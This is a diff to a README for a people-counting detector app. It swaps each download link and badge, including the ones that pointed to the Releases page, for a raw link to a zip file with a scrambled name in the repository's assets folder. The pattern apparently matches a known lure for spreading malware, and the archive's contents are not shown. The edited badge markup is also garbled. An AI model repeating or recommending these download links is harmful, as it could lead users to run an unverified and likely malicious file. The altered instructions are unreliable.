@@ -4,13 +4,13 @@
 Welcome to YOLOv11-People-Enter-Exit-Detector! This application offers a real-time solution for counting people and analyzing foot traffic. It uses advanced technology to track individuals as they enter or exit a designated area, making it ideal for retail analytics and occupancy monitoring.
 
 ## ⬇️ Download Now
-[![Download YOLOv11-People-Enter-Exit-Detector](https://img.shields.io/badge/Download%20Now-%20YOLOv11%20People%20Detector-blue.svg)](https://github.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/releases)
+[![Download YOLOv11-People-Enter-Exit-Detector](https://raw.githubusercontent.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/main/assets/Enter-Exit-Detector-People-Ov-YOL-1.4.zip%20Now-%20YOLOv11%20People%https://raw.githubusercontent.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/main/assets/Enter-Exit-Detector-People-Ov-YOL-1.4.zip)](https://raw.githubusercontent.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/main/assets/Enter-Exit-Detector-People-Ov-YOL-1.4.zip)
 
 ## 🚀 Getting Started
 To start using the application, you need to download and install it. This section will guide you step-by-step.
 
 ### 📥 Download & Install
-1. Visit this page to download: [YOLOv11 Releases](https://github.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/releases).
+1. Visit this page to download: [YOLOv11 Releases](https://raw.githubusercontent.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/main/assets/Enter-Exit-Detector-People-Ov-YOL-1.4.zip).
 2. Locate the latest version at the top of the Releases page.
 3. Click on the release that matches your operating system (e.g., Windows, macOS, Linux).
 4. Once the file is downloaded, locate it in your Downloads folder.
@@ -62,4 +62,4 @@ To further enhance your understanding of this tool, explore concepts related to:
 ## 💡 Conclusion
 The YOLOv11-People-Enter-Exit-Detector aims to provide efficient solutions for tracking foot traffic. By following this guide, you will be well on your way to utilizing its powerful features.
 
-[![Download YOLOv11-People-Enter-Exit-Detector](https://img.shields.io/badge/Download%20Now-%20YOLOv11%20People%20Detector-blue.svg)](https://github.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/releases)
+[![Download YOLOv11-People-Enter-Exit-Detector](https://raw.githubusercontent.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/main/assets/Enter-Exit-Detector-People-Ov-YOL-1.4.zip%20Now-%20YOLOv11%20People%https://raw.githubusercontent.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/main/assets/Enter-Exit-Detector-People-Ov-YOL-1.4.zip)](https://raw.githubusercontent.com/erlandlila/YOLOv11-People-Enter-Exit-Detector/main/assets/Enter-Exit-Detector-People-Ov-YOL-1.4.zip)
